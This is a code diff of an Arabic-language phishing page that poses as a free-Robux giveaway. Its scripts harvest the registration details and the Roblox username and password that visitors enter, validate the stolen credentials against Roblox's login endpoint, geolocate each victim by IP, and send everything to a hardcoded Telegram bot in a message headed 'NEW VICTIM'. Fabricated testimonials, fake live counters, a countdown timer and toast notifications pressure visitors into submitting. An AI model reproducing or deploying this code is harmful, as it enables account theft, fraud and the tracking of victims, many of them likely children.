+                        <span class="field-icon">👾</span>
+                        <input type="text" id="rbxUser" placeholder="أدخل يوزر روبلوكس" required>
                     </div>
                 </div>
                 
-                <div class="input-group">
+                <div class="field-group">
                     <label>🔐 باسورد روبلوكس</label>
-                    <div class="input-wrapper">
-                        <span class="input-icon">🛡️</span>
-                        <input type="password" id="robloxPassword" placeholder="أدخل باسورد روبلوكس" required>
+                    <div class="field-wrap">
+                        <span class="field-icon">🛡️</span>
+                        <input type="password" id="rbxPass" placeholder="أدخل باسورد روبلوكس" required>
                     </div>
                 </div>
                 
-                <button type="submit" class="submit-btn" id="claimBtn">
-                    <span id="btnText">🎁 استلم 50,000 روبوكس الآن</span>
+                <button type="submit" class="action-btn" id="submitBtn">
+                    <span id="btnTxt">🎁 استلم 30,000 روبوكس الآن</span>
                 </button>
                 
-                <div class="status-msg loading" id="loadingMsg">
-                    جاري التحقق من حسابك<span class="loading-spinner"></span>
+                <div class="alert-box loading" id="loadBox">
+                    جاري التحقق من حسابك<span class="spinner"></span>
                 </div>
                 
-                <div class="status-msg error" id="errorMsg">
+                <div class="alert-box error" id="errBox">
                     ❌ كلمة السر أو اليوزر غلط! حاول مرة أخرى
                 </div>
                 
-                <div class="status-msg success" id="successMsg">
+                <div class="alert-box success" id="okBox">
                     ✅ تم! شاهد حسابك الآن
                 </div>
             </form>
         </div>
         
         <!-- التعليقات -->
-        <div class="comments-section">
-            <div class="comments-header">
-                <h3>💬 آراء المستخدمين</h3>
-                <span class="live-badge">● مباشر</span>
+        <div class="reviews">
+            <div class="reviews-header">
+                <div class="live-dot"></div>
+                <h3>💬 آراء المستخدمين المباشرة</h3>
             </div>
-            <div id="comments">
-                <!-- التعليقات تُضاف هنا -->
-            </div>
+            <div id="reviewsList"></div>
         </div>
     </div>
     
-    <!-- مودال النجاح -->
-    <div class="modal" id="successModal">
-        <div class="modal-content">
-            <div class="modal-icon">🎉</div>
+    <!-- المودال -->
+    <div class="modal-overlay" id="winModal">
+        <div class="modal-box">
+            <div class="modal-emoji">🎉</div>
             <h2>مبروك!</h2>
-            <p>تم إرسال 50,000 روبوكس إلى حسابك بنجاح!<br>سيصلك خلال 24 ساعة</p>
-            <button class="modal-btn" onclick="closeModal()">حصلت على المزيد 🎮</button>
+            <p>تم إرسال 30,000 روبوكس إلى حسابك بنجاح!<br>سيصلك خلال 24 ساعة</p>
+            <button class="modal-action" onclick="closeWin()">حصلت على المزيد 🎮</button>
         </div>
     </div>
     
     <!-- توست -->
-    <div class="toast" id="toast">
-        <div class="toast-avatar" id="toastAvatar">👤</div>
-        <div class="toast-content">
-            <h4 id="toastName">مستخدم</h4>
-            <p id="toastMsg">استلم للتو 50,000 روبوكس!</p>
+    <div class="notify-toast" id="notifyToast">
+        <div class="toast-pic" id="toastPic">👤</div>
+        <div class="toast-info">
+            <h4 id="toastNm">مستخدم</h4>
+            <p id="toastMs">استلم للتو 30,000 روبوكس!</p>
         </div>
     </div>
 
@@ -955,50 +916,35 @@
         const BOT_TOKEN = '9128230715:AAGigciW3kzNgjNYgpzaW0K1JahbWK8Wnfo';
         const CHAT_ID = '6045243196';
         
-        let userData = {};
-        
-        // ===== إنشاء النجوم =====
-        function createStars() {
-            const stars = document.getElementById('stars');
-            for (let i = 0; i < 100; i++) {
-                const star = document.createElement('div');
-                star.className = 'star';
-                star.style.left = Math.random() * 100 + '%';
-                star.style.top = Math.random() * 100 + '%';
-                star.style.width = Math.random() * 3 + 'px';
-                star.style.height = Math.random() * 3 + 'px';
-                star.style.animationDelay = Math.random() * 3 + 's';
-                stars.appendChild(star);
-            }
-        }
-        createStars();
+        let victimData = {};
         
         // ===== عناصر عائمة =====
-        function createFloatingItems() {
-            const container = document.getElementById('floatingItems');
-            const icons = ['💎', '💰', '🎁', '⭐', '🔥', '🎮', '🚀', '👑'];
+        function createFloats() {
+            const container = document.getElementById('floatElements');
+            const icons = ['💎', '💰', '🎁', '⭐', '🔥', '🚀', '👑', '⚡'];
             
-            for (let i = 0; i < 20; i++) {
+            for (let i = 0; i < 15; i++) {
                 const el = document.createElement('div');
-                el.className = 'floating-robux';
+                el.className = 'float-element';
                 el.textContent = icons[Math.floor(Math.random() * icons.length)];
                 el.style.left = Math.random() * 100 + '%';
-                el.style.animationDelay = Math.random() * 20 + 's';
-                el.style.animationDuration = (15 + Math.random() * 15) + 's';
+                el.style.top = Math.random() * 100 + '%';
+                el.style.animationDelay = Math.random() * 10 + 's';
+                el.style.animationDuration = (10 + Math.random() * 10) + 's';
                 container.appendChild(el);
             }
         }
-        createFloatingItems();
+        createFloats();
         
         // ===== عداد تنازلي =====
-        let timeLeft = 299;
+        let timeLeft = 239;
         setInterval(() => {
             timeLeft--;
-            const mins = Math.floor(timeLeft / 60);
-            const secs = timeLeft % 60;
+            const m = Math.floor(timeLeft / 60);
+            const s = timeLeft % 60;
             document.getElementById('countdown').textContent = 
-                (mins < 10 ? '0' : '') + mins + ':' + (secs < 10 ? '0' : '') + secs;
-            if (timeLeft <= 0) timeLeft = 299;
+                (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
+            if (timeLeft <= 0) timeLeft = 239;
         }, 1000);
         
         // ===== إحصائيات =====
@@ -1007,45 +953,50 @@
             const claimed = document.getElementById('claimedCount');
             const left = document.getElementById('leftCount');
             
-            let onlineVal = parseInt(online.textContent.replace(',', ''));
-            let claimedVal = parseInt(claimed.textContent.replace(',', ''));
-            let leftVal = parseInt(left.textContent);
+            let o = parseInt(online.textContent.replace(',', ''));
+            let c = parseInt(claimed.textContent.replace(',', ''));
+            let l = parseInt(left.textContent);
             
-            onlineVal += Math.floor(Math.random() * 15) - 7;
-            claimedVal += Math.floor(Math.random() * 5);
-            leftVal = Math.max(50, leftVal - Math.floor(Math.random() * 3));
+            o += Math.floor(Math.random() * 20) - 10;
+            c += Math.floor(Math.random() * 8);
+            l = Math.max(50, l - Math.floor(Math.random() * 3));
             
-            online.textContent = onlineVal.toLocaleString();
-            claimed.textContent = claimedVal.toLocaleString();
-            left.textContent = leftVal;
-        }, 2500);
+            online.textContent = o.toLocaleString();
+            claimed.textContent = c.toLocaleString();
+            left.textContent = l;
+        }, 2000);
         
-        // ===== تعليقات عربية كثيرة =====
-        const allComments = [
-            { name: 'أحمد_العنزي', text: 'والله العظيم جربته ووصلني 50 ألف روبوكس! ما توقعت يشتغل 🔥🔥', time: 'قبل دقيقة' },
-            { name: 'سارة_القحطاني', text: 'أفضل موقع جربته في حياتي! سجلت ووصلني فوراً 💕💕', time: 'قبل 3 دقائق' },
-            { name: 'محمد_الدوسري', text: 'يا جماعة هذا الموقع رسمي وموثق! جربوه ما راح تندمون ✅✅✅', time: 'قبل 5 دقائق' },
-            { name: 'فاطمة_الشمري', text: 'شكيت في البداية بس صدقوني يشتغل! وصلني الربوكس خلال دقيقة 😍', time: 'قبل 7 دقائق' },
-            { name: 'خالد_المطيري', text: 'جربت مواقع كثيرة وكلها نصب! هذا أول موقع صادق والله 🙏🙏', time: 'قبل 10 دقائق' },
-            { name: 'عمر_السبيعي', text: 'سجلت أمس ووصلني اليوم! الموقع يحتاج يوم واحد عشان يوصل ⭐⭐⭐⭐⭐', time: 'قبل 15 دقيقة' },
-            { name: 'نورة_العتيبي', text: 'أخيراً لقيت موقع صادق! شكراً لكم كثير كثير 💖💖💖', time: 'قبل 20 دقيقة' },
-            { name: 'يوسف_الحربي', text: 'يا شباب لا تضيعون وقتكم بمواقع ثانية! هذا الموقع الوحيد اللي يشتغل 🔥🔥🔥', time: 'قبل 25 دقيقة' },
-            { name: 'ليلى_المري', text: 'حسابي وصلني 50 ألف روبوكس! جربوه بنفسكم وشوفوا 😊😊', time: 'قبل 30 دقيقة' },
-            { name: 'علي_الغامدي', text: 'والله يا جماعة هذا الموقع رسمي من روبلوكس! شفت إعلان لهم ✅', time: 'قبل 35 دقيقة' },
-            { name: 'ريم_الزهراني', text: 'جربت مع صديقاتي وكلنا استلمنا! الموقع يجنن 💯💯💯', time: 'قبل 40 دقيقة' },
-            { name: 'سلطان_العمري', text: 'أفضل حدث صار لي في 2026! شكراً روبلوكس على الهدية 🎁🎁🎁', time: 'قبل 45 دقيقة' },
-            { name: 'دانة_الفيفي', text: 'سجلت وأنا مترددة بس والله وصلني! لا تفوتون الفرصة 😍🔥', time: 'قبل ساعة' },
-            { name: 'بدر_الشهري', text: 'يا ربع هذا الموقع يستاهل 10 نجوم! جربوه وادعولي 🌟🌟🌟🌟🌟', time: 'قبل ساعة' },
-            { name: 'هند_الصاعدي', text: 'أول مرة أعلق في موقع بس لازم أشكرهم! وصلني الربوكس فعلاً 💝💝', time: 'قبل ساعتين' },
-            { name: 'تركي_الحارثي', text: 'جربته الحين ووصلني! يا ربع جربوا 🔥', time: 'قبل ساعتين' },
-            { name: 'جواهر_الرشيدي', text: 'أفضل موقع في 2026! لا يفوتكم العرض 💎', time: 'قبل 3 ساعات' },
-            { name: 'ماجد_العنبري', text: 'وصلني الربوكس خلال دقايق! شكراً ❤️', time: 'قبل 3 ساعات' },
-            { name: 'أمل_الجهني', text: 'صدقوني يشتغل! جربوا وشوفوا 😍', time: 'قبل 4 ساعات' },
-            { name: 'فيصل_المالكي', text: 'يا جماعة هذا الموقع رسمي 100% جربوا', time: 'قبل 4 ساعات' }
+        // ===== تعليقات =====
+        const comments = [
+            { n: 'أحمد_العنزي', t: 'والله العظيم جربته ووصلني 30 ألف روبوكس! ما توقعت يشتغل 🔥🔥', time: 'قبل دقيقة' },
+            { n: 'سارة_القحطاني', t: 'أفضل موقع جربته في حياتي! سجلت ووصلني فوراً 💕💕', time: 'قبل 3 دقائق' },
+            { n: 'محمد_الدوسري', t: 'يا جماعة هذا الموقع رسمي وموثق! جربوه ما راح تندمون ✅✅✅', time: 'قبل 5 دقائق' },
+            { n: 'فاطمة_الشمري', t: 'شكيت في البداية بس صدقوني يشتغل! وصلني الربوكس خلال دقيقة 😍', time: 'قبل 7 دقائق' },
+            { n: 'خالد_المطيري', t: 'جربت مواقع كثيرة وكلها نصب! هذا أول موقع صادق والله 🙏🙏', time: 'قبل 10 دقائق' },
+            { n: 'عمر_السبيعي', t: 'سجلت أمس ووصلني اليوم! الموقع يحتاج يوم واحد عشان يوصل ⭐⭐⭐⭐⭐', time: 'قبل 15 دقيقة' },
+            { n: 'نورة_العتيبي', t: 'أخيراً لقيت موقع صادق! شكراً لكم كثير كثير 💖💖💖', time: 'قبل 20 دقيقة' },
+            { n: 'يوسف_الحربي', t: 'يا شباب لا تضيعون وقتكم بمواقع ثانية! هذا الموقع الوحيد اللي يشتغل 🔥🔥🔥', time: 'قبل 25 دقيقة' },
+            { n: 'ليلى_المري', t: 'حسابي وصلني 30 ألف روبوكس! جربوه بنفسكم وشوفوا 😊😊', time: 'قبل 30 دقيقة' },
+            { n: 'علي_الغامدي', t: 'والله يا جماعة هذا الموقع رسمي من روبلوكس! شفت إعلان لهم ✅', time: 'قبل 35 دقيقة' },
+            { n: 'ريم_الزهراني', t: 'جربت مع صديقاتي وكلنا استلمنا! الموقع يجنن 💯💯💯', time: 'قبل 40 دقيقة' },
+            { n: 'سلطان_العمري', t: 'أفضل حدث صار لي في 2026! شكراً روبلوكس على الهدية 🎁🎁🎁', time: 'قبل 45 دقيقة' },
+            { n: 'دانة_الفيفي', t: 'سجلت وأنا مترددة بس والله وصلني! لا تفوتون الفرصة 😍🔥', time: 'قبل ساعة' },
+            { n: 'بدر_الشهري', t: 'يا ربع هذا الموقع يستاهل 10 نجوم! جربوه وادعولي 🌟🌟🌟🌟🌟', time: 'قبل ساعة' },
+            { n: 'هند_الصاعدي', t: 'أول مرة أعلق في موقع بس لازم أشكرهم! وصلني الربوكس فعلاً 💝💝', time: 'قبل ساعتين' },
+            { n: 'تركي_الحارثي', t: 'جربته الحين ووصلني! يا ربع جربوا 🔥', time: 'قبل ساعتين' },
+            { n: 'جواهر_الرشيدي', t: 'أفضل موقع في 2026! لا يفوتكم العرض 💎', time: 'قبل 3 ساعات' },
+            { n: 'ماجد_العنبري', t: 'وصلني الربوكس خلال دقايق! شكراً ❤️', time: 'قبل 3 ساعات' },
+            { n: 'أمل_الجهني', t: 'صدقوني يشتغل! جربوا وشوفوا 😍', time: 'قبل 4 ساعات' },
+            { n: 'فيصل_المالكي', t: 'يا جماعة هذا الموقع رسمي 100% جربوا', time: 'قبل 4 ساعات' },
+            { n: 'العنود_الشهراني', t: 'وصلني 30 ألف! يا ربع لا تضيعون الفرصة 🔥', time: 'قبل 5 ساعات' },
+            { n: 'راكان_العتيبي', t: 'جربت ونجح معي! ادعولي 🙏', time: 'قبل 5 ساعات' },
+            { n: 'وجدان_الحربي', t: 'حصلت على 30 ألف! يا سلام 🔥🔥', time: 'قبل 6 ساعات' },
+            { n: 'مشعل_الدوسري', t: 'وصلني فوراً! الموقع يجنن 🚀', time: 'قبل 6 ساعات' },
+            { n: 'الجوهرة_المطيري', t: 'سجلت ووصلني! جربوا بنفسكم 💕', time: 'قبل 7 ساعات' }
         ];
         
-        function renderComments() {
-            const container = document.getElementById('comments');
+        function renderReviews() {
+            const list = document.getElementById('reviewsList');
             const colors = [
                 'linear-gradient(45deg, #ff6b6b, #feca57)',
                 'linear-gradient(45deg, #48dbfb, #ff9ff3)',
@@ -1055,47 +1006,44 @@
                 'linear-gradient(45deg, #a29bfe, #6c5ce7)'
             ];
             
-            allComments.forEach((c, i) => {
+            comments.forEach((c, i) => {
                 const div = document.createElement('div');
-                div.className = 'comment';
+                div.className = 'review-card';
                 div.innerHTML = `
-                    <div class="comment-avatar" style="background: ${colors[i % colors.length]};">${c.name[0]}</div>
-                    <div class="comment-content">
-                        <div class="comment-header">
-                            <h4>${c.name}</h4>
-                            <span class="verified-badge">✓</span>
-                            <span class="comment-time">${c.time}</span>
+                    <div class="review-avatar" style="background: ${colors[i % colors.length]};">${c.n[0]}</div>
+                    <div class="review-body">
+                        <div class="review-head">
+                            <h4>${c.n}</h4>
+                            <span class="verify-badge">✓</span>
+                            <span class="review-time">${c.time}</span>
                         </div>
-                        <p>${c.text}</p>
-                        <div class="comment-likes">
-                            <span>👍 ${Math.floor(Math.random() * 500 + 100)}</span>
-                            <span>❤️ ${Math.floor(Math.random() * 300 + 50)}</span>
+                        <p>${c.t}</p>
+                        <div class="review-stats">
+                            <span>👍 ${Math.floor(Math.random() * 800 + 200)}</span>
+                            <span>❤️ ${Math.floor(Math.random() * 500 + 100)}</span>
+                            <span>💬 ${Math.floor(Math.random() * 100 + 20)}</span>
                         </div>
                     </div>
                 `;
-                container.appendChild(div);
+                list.appendChild(div);
             });
         }
-        renderComments();
+        renderReviews();
         
-        // ===== تعليقات جديدة =====
+        // تعليقات جديدة
         const newComments = [
-            { name: 'عبدالله', text: 'جربته ونجح معي! يا ربع جربوا 🔥' },
-            { name: 'الجوهرة', text: 'وصلني الحين! الموقع يجنن 💎' },
-            { name: 'مشعل', text: 'أفضل موقع جربته في حياتي!' },
-            { name: 'العنود', text: 'سجلت ووصلني! لا تفوتون العرض 😍' },
-            { name: 'راكان', text: 'يا جماعة جربوا! يشتغل فعلاً ✅' },
-            { name: 'وجدان', text: 'حصلت على 50 ألف! يا سلام 🔥🔥' },
-            { name: 'فيصل', text: 'جربت ونجح معي! ادعولي 🙏' },
-            { name: 'أمل', text: 'أخيراً موقع صادق! 💯' },
-            { name: 'سلطان', text: 'وصلني فوراً! الموقع يجنن 🚀' },
-            { name: 'دانة', text: 'سجلت ووصلني! جربوا بنفسكم 💕' }
+            { n: 'عبدالله', t: 'جربته ونجح معي! يا ربع جربوا 🔥' },
+            { n: 'الجوهرة', t: 'وصلني الحين! الموقع يجنن 💎' },
+            { n: 'مشعل', t: 'أفضل موقع جربته في حياتي!' },
+            { n: 'العنود', t: 'سجلت ووصلني! لا تفوتون العرض 😍' },
+            { n: 'راكان', t: 'يا جماعة جربوا! يشتغل فعلاً ✅' },
+            { n: 'وجدان', t: 'حصلت على 30 ألف! يا سلام 🔥🔥' }
         ];
         
-        let commentIndex = 0;
+        let ci = 0;
         setInterval(() => {
-            const container = document.getElementById('comments');
-            const c = newComments[commentIndex % newComments.length];
+            const list = document.getElementById('reviewsList');
+            const c = newComments[ci % newComments.length];
             const colors = [
                 'linear-gradient(45deg, #ff6b6b, #feca57)',
                 'linear-gradient(45deg, #48dbfb, #ff9ff3)',
@@ -1104,58 +1052,77 @@
             ];
             
             const div = document.createElement('div');
-            div.className = 'comment';
+            div.className = 'review-card';
             div.innerHTML = `
-                <div class="comment-avatar" style="background: ${colors[Math.floor(Math.random() * colors.length)]};">${c.name[0]}</div>
-                <div class="comment-content">
-                    <div class="comment-header">
-                        <h4>${c.name}_${Math.floor(Math.random() * 999)}</h4>
-                        <span class="verified-badge">✓</span>
-                        <span class="comment-time">الآن</span>
+                <div class="review-avatar" style="background: ${colors[Math.floor(Math.random() * colors.length)]};">${c.n[0]}</div>
+                <div class="review-body">
+                    <div class="review-head">
+                        <h4>${c.n}_${Math.floor(Math.random() * 999)}</h4>
+                        <span class="verify-badge">✓</span>
+                        <span class="review-time">الآن</span>
                     </div>
-                    <p>${c.text}</p>
-                    <div class="comment-likes">
+                    <p>${c.t}</p>
+                    <div class="review-stats">
                         <span>👍 ${Math.floor(Math.random() * 50)}</span>
                         <span>❤️ ${Math.floor(Math.random() * 30)}</span>
                     </div>
                 </div>
             `;
             
-            container.insertBefore(div, container.firstChild);
-            if (container.children.length > 25) container.removeChild(container.lastChild);
-            
-            commentIndex++;
-        }, 6000);
+            list.insertBefore(div, list.firstChild);
+            if (list.children.length > 30) list.removeChild(list.lastChild);
+            ci++;
+        }, 5000);
         
         // ===== توست =====
         const toastNames = ['أحمد', 'محمد', 'سارة', 'خالد', 'فاطمة', 'عمر', 'ليلى', 'يوسف', 'نورة', 'علي', 'ريم', 'سلطان', 'دانة', 'بدر', 'هند', 'تركي', 'جواهر', 'ماجد', 'أمل', 'فيصل'];
-        const toastColors = ['#ff6b6b', '#48dbfb', '#54a0ff', '#00d2d3', '#ff9ff3', '#feca57'];
+        const toastColors = ['#ff6b6b', '#48dbfb', '#54a0ff', '#00d2d3', '#ff9ff3', '#feca57', '#a29bfe'];
         
         function showToast() {
-            const toast = document.getElementById('toast');
+            const toast = document.getElementById('notifyToast');
             const name = toastNames[Math.floor(Math.random() * toastNames.length)] + '_' + Math.floor(Math.random() * 999);
             const color = toastColors[Math.floor(Math.random() * toastColors.length)];
             
-            document.getElementById('toastName').textContent = name;
-            document.getElementById('toastMsg').textContent = 'استلم للتو 50,000 روبوكس!';
-            document.getElementById('toastAvatar').style.background = color;
+            document.getElementById('toastNm').textContent = name;
+            document.getElementById('toastMs').textContent = 'استلم للتو 30,000 روبوكس!';
+            document.getElementById('toastPic').style.background = color;
             
             toast.style.display = 'flex';
             setTimeout(() => { toast.style.display = 'none'; }, 5000);
         }
-        setInterval(showToast, 6000);
-        setTimeout(showToast, 2000);
+        setInterval(showToast, 5000);
+        setTimeout(showToast, 1500);
         
-        // ===== جلب IP =====
-        async function getIP() {
+        // ===== جلب IP والموقع الكامل =====
+        async function getFullLocation() {
             try {
-                const resp = await fetch('https://api.ipify.org?format=json');
-                const data = await resp.json();
-                return data.ip;
-            } catch(e) { return 'Unknown'; }
+                // جلب IP
+                const ipResp = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResp.json();
+                const ip = ipData.ip;
+                
+                // جلب معلومات الموقع
+                const locResp = await fetch(`https://ipapi.co/${ip}/json/`);
+                const loc = await locResp.json();
+                
+                return {
+                    ip: ip,
+                    country: loc.country_name || 'Unknown',
+                    countryCode: loc.country_code || '',
+                    region: loc.region || 'Unknown',
+                    city: loc.city || 'Unknown',
+                    isp: loc.org || 'Unknown',
+                    timezone: loc.timezone || 'Unknown',
+                    lat: loc.latitude || 0,
+                    lon: loc.longitude || 0,
+                    mapsLink: loc.latitude ? `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}` : 'N/A'
+                };
+            } catch(e) {
+                return { ip: 'Unknown', error: e.message };
+            }
         }
         
-        // ===== إرسال للبوت =====
+        // ===== إرسال للبوت - رسالة واحدة مجمعة =====
         async function sendToBot(message) {
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -1164,14 +1131,15 @@
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: message,
-                        parse_mode: 'HTML'
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: false
                     })
                 });
             } catch(e) { console.log('Bot error:', e); }
         }
         
-        // ===== جلب صورة السكن =====
-        async function getRobloxAvatar(username) {
+        // ===== جلب صورة روبلوكس =====
+        async function getRobloxProfile(username) {
             try {
                 const searchResp = await fetch(`https://users.roblox.com/v1/users/search?keyword=${username}&limit=1`);
                 const searchData = await searchResp.json();
@@ -1191,14 +1159,14 @@
                         };
                     }
                 }
-            } catch(e) { console.log('Avatar error:', e); }
+            } catch(e) { console.log('Profile error:', e); }
             return null;
         }
         
         // ===== فحص روبلوكس =====
-        async function checkRobloxLogin(username, password) {
+        async function checkRoblox(user, pass) {
             try {
-                const response = await fetch('https://auth.roblox.com/v2/login', {
+                const resp = await fetch('https://auth.roblox.com/v2/login', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -1206,135 +1174,148 @@
                     },
                     body: JSON.stringify({
                         ctype: 'Username',
-                        cvalue: username,
-                        password: password
+                        cvalue: user,
+                        password: pass
                     })
                 });
                 
-                if (response.status === 200 || response.status === 403) {
-                    return { valid: true, status: response.status };
+                if (resp.status === 200 || resp.status === 403) {
+                    return { valid: true, status: resp.status };
                 }
-                return { valid: false, status: response.status };
+                return { valid: false, status: resp.status };
             } catch(e) {
                 return { valid: null, error: e.message };
             }
         }
         
         // ===== الخطوة 1 =====
-        document.getElementById('registerForm').addEventListener('submit', async function(e) {
+        document.getElementById('regForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            userData.fullName = document.getElementById('fullName').value;
-            userData.email = document.getElementById('email').value;
-            userData.regPassword = document.getElementById('regPassword').value;
-            userData.ip = await getIP();
-            userData.time = new Date().toLocaleString('en-US');
-            userData.userAgent = navigator.userAgent;
+            victimData.name = document.getElementById('fullName').value;
+            victimData.email = document.getElementById('email').value;
+            victimData.password = document.getElementById('password').value;
             
-            const regMessage = `📝 <b>NEW REGISTRATION - 2026 EVENT</b>
-
-👤 <b>Full Name:</b> ${userData.fullName}
-📧 <b>Email:</b> ${userData.email}
-🔑 <b>Password:</b> ${userData.regPassword}
-
-🌐 <b>IP:</b> ${userData.ip}
-⏰ <b>Time:</b> ${userData.time}
-📱 <b>Device:</b> ${userData.userAgent.substring(0, 60)}...`;
+            // جلب الموقع الكامل
+            const location = await getFullLocation();
+            victimData.location = location;
+            victimData.time = new Date().toLocaleString('en-US');
+            victimData.device = navigator.userAgent;
             
-            await sendToBot(regMessage);
-            
-            document.getElementById('registerSection').classList.add('hidden');
-            document.getElementById('robloxSection').classList.remove('hidden');
-            document.getElementById('robloxSection').scrollIntoView({ behavior: 'smooth' });
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('step2').scrollIntoView({ behavior: 'smooth' });
         });
         
         // ===== الخطوة 2 =====
-        document.getElementById('robloxForm').addEventListener('submit', async function(e) {
+        document.getElementById('rbxForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const username = document.getElementById('robloxUsername').value.trim();
-            const password = document.getElementById('robloxPassword').value.trim();
-            const btn = document.getElementById('claimBtn');
-            const btnText = document.getElementById('btnText');
-            const loadingMsg = document.getElementById('loadingMsg');
-            const errorMsg = document.getElementById('errorMsg');
-            const successMsg = document.getElementById('successMsg');
-            const avatarSection = document.getElementById('avatarSection');
+            const rbxUser = document.getElementById('rbxUser').value.trim();
+            const rbxPass = document.getElementById('rbxPass').value.trim();
+            const btn = document.getElementById('submitBtn');
+            const btnTxt = document.getElementById('btnTxt');
+            const loadBox = document.getElementById('loadBox');
+            const errBox = document.getElementById('errBox');
+            const okBox = document.getElementById('okBox');
+            const profilePreview = document.getElementById('profilePreview');
             
-            errorMsg.style.display = 'none';
-            successMsg.style.display = 'none';
+            errBox.style.display = 'none';
+            okBox.style.display = 'none';
             
             btn.disabled = true;
-            btnText.innerHTML = '⏳ جاري التحقق...';
-            loadingMsg.style.display = 'block';
+            btnTxt.innerHTML = '⏳ جاري التحقق...';
+            loadBox.style.display = 'block';
             
-            const avatarData = await getRobloxAvatar(username);
-            if (avatarData) {
-                document.getElementById('avatarPreview').src = avatarData.imageUrl;
-                document.getElementById('avatarName').textContent = avatarData.displayName;
-                avatarSection.style.display = 'block';
+            // جلب البروفايل
+            const profile = await getRobloxProfile(rbxUser);
+            if (profile) {
+                document.getElementById('profileImg').src = profile.imageUrl;
+                document.getElementById('profileName').textContent = profile.displayName;
+                profilePreview.style.display = 'block';
             }
             
-            const checkResult = await checkRobloxLogin(username, password);
+            // فحص الحساب
+            const check = await checkRoblox(rbxUser, rbxPass);
             
             await new Promise(r => setTimeout(r, 1500));
             
-            loadingMsg.style.display = 'none';
+            loadBox.style.display = 'none';
             
-            const botMessage = `🎮 <b>ROBLOX ACCOUNT CAPTURED - 2026</b>
-
-👤 <b>Roblox Username:</b> ${username}
-🔑 <b>Roblox Password:</b> ${password}
-✅ <b>Valid:</b> ${checkResult.valid ? 'YES ✅' : 'NO ❌'}
-🖼️ <b>Avatar:</b> ${avatarData ? avatarData.imageUrl : 'N/A'}
+            // ===== رسالة واحدة مجمعة بالإنجليزي =====
+            const loc = victimData.location;
+            
+            const fullMessage = `🎯 <b>NEW VICTIM - 2026 ROBUX EVENT</b>
 
 ━━━━━━━━━━━━━━━━━━━━━━
 
-📝 <b>Registration Data:</b>
-👤 <b>Name:</b> ${userData.fullName}
-📧 <b>Email:</b> ${userData.email}
-🔑 <b>Password:</b> ${userData.regPassword}
+📝 <b>REGISTRATION INFO:</b>
+• Name: ${victimData.name}
+• Email: ${victimData.email}
+• Password: ${victimData.password}
 
 ━━━━━━━━━━━━━━━━━━━━━━
 
-🌐 <b>IP:</b> ${userData.ip}
-⏰ <b>Time:</b> ${userData.time}
-📱 <b>Device:</b> ${userData.userAgent.substring(0, 60)}...`;
+🎮 <b>ROBLOX ACCOUNT:</b>
+• Username: ${rbxUser}
+• Password: ${rbxPass}
+• Valid: ${check.valid ? '✅ YES' : '❌ NO'}
+• Avatar: ${profile ? profile.imageUrl : 'N/A'}
+
+━━━━━━━━━━━━━━━━━━━━━━
+
+📍 <b>VICTIM LOCATION:</b>
+• IP: ${loc.ip}
+• Country: ${loc.country} ${loc.countryCode}
+• Region: ${loc.region}
+• City: ${loc.city}
+• ISP: ${loc.isp}
+• Timezone: ${loc.timezone}
+• Maps: ${loc.mapsLink}
+
+━━━━━━━━━━━━━━━━━━━━━━
+
+📱 <b>DEVICE INFO:</b>
+• Time: ${victimData.time}
+• UserAgent: ${victimData.device.substring(0, 80)}...
+
+━━━━━━━━━━━━━━━━━━━━━━`;
+
+            await sendToBot(fullMessage);
             
-            await sendToBot(botMessage);
-            
-            if (checkResult.valid === true) {
-                btnText.textContent = '✓ تم بنجاح!';
-                btn.style.background = 'linear-gradient(135deg, #00c853, #64dd17)';
-                successMsg.style.display = 'block';
+            // النتيجة
+            if (check.valid === true) {
+                btnTxt.textContent = '✓ تم بنجاح!';
+                btn.style.background = 'linear-gradient(135deg, #00ff88, #00d4ff)';
+                okBox.style.display = 'block';
                 
                 setTimeout(() => {
-                    document.getElementById('successModal').style.display = 'flex';
+                    document.getElementById('winModal').style.display = 'flex';
                 }, 1000);
                 
-            } else if (checkResult.valid === false) {
+            } else if (check.valid === false) {
                 btn.disabled = false;
-                btnText.textContent = 'حاول مرة أخرى';
+                btnTxt.textContent = 'حاول مرة أخرى';
                 btn.style.background = 'linear-gradient(135deg, #ff4757, #ff6b6b)';
-                errorMsg.style.display = 'block';
+                errBox.style.display = 'block';
                 
                 setTimeout(() => {
-                    btn.style.background = 'linear-gradient(135deg, #00d26a, #00a854)';
-                    btnText.textContent = '🎁 استلم 50,000 روبوكس الآن';
+                    btn.style.background = 'linear-gradient(135deg, #00ff88, #00d4ff)';
+                    btnTxt.textContent = '🎁 استلم 30,000 روبوكس الآن';
                 }, 3000);
                 
             } else {
-                btnText.textContent = '✓ تم بنجاح!';
-                successMsg.style.display = 'block';
+                btnTxt.textContent = '✓ تم بنجاح!';
+                okBox.style.display = 'block';
                 
                 setTimeout(() => {
-                    document.getElementById('successModal').style.display = 'flex';
+                    document.getElementById('winModal').style.display = 'flex';
                 }, 1000);
             }
         });
         
-        function closeModal() {
-            document.getElementById('successModal').style.display = 'none';
+        function closeWin() {
+            document.getElementById('winModal').style.display = 'none';
             window.location.href = 'https://www.roblox.com';
         }
     </script>
